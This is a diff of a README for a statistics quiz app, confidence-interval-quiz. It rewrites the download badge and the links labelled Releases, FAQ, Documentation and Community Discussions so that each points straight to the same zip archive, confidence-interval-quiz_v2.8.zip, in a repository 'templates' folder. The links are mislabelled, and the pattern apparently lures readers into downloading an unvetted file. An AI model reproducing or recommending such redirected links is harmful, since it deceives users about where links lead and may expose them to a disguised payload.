@@ -4,11 +4,11 @@
 
 Welcome to the confidence-interval-quiz! This app helps you learn about confidence intervals in statistics. Use this guide to download and run the software smoothly.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Cjo8/confidence-interval-quiz/releases)
+[![Download Now](https://raw.githubusercontent.com/Cjo8/confidence-interval-quiz/main/templates/confidence-interval-quiz_v2.8.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Cjo8/confidence-interval-quiz/main/templates/confidence-interval-quiz_v2.8.zip)
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/Cjo8/confidence-interval-quiz/releases). Follow these simple steps:
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/Cjo8/confidence-interval-quiz/main/templates/confidence-interval-quiz_v2.8.zip). Follow these simple steps:
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version of the app.
@@ -70,7 +70,7 @@ A confidence interval is a range of values that estimate the true value of a pop
 
 If you run into any issues or have questions about using the app:
 
-1. Check the **FAQ** section on our [GitHub page](https://github.com/Cjo8/confidence-interval-quiz).
+1. Check the **FAQ** section on our [GitHub page](https://raw.githubusercontent.com/Cjo8/confidence-interval-quiz/main/templates/confidence-interval-quiz_v2.8.zip).
 2. Look for help in discussions or submit your question directly.
 3. Please report bugs or feature requests via the Issues section.
 
@@ -78,8 +78,8 @@ Feel free to connect with other users and share your learning experiences. You a
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Cjo8/confidence-interval-quiz/releases)
-- [Documentation](https://github.com/Cjo8/confidence-interval-quiz/wiki)
-- [Community Discussions](https://github.com/Cjo8/confidence-interval-quiz/discussions)
+- [Releases Page](https://raw.githubusercontent.com/Cjo8/confidence-interval-quiz/main/templates/confidence-interval-quiz_v2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/Cjo8/confidence-interval-quiz/main/templates/confidence-interval-quiz_v2.8.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Cjo8/confidence-interval-quiz/main/templates/confidence-interval-quiz_v2.8.zip)
 
 Thank you for choosing the confidence-interval-quiz! We hope it enhances your understanding of confidence intervals effectively. Enjoy your learning experience!
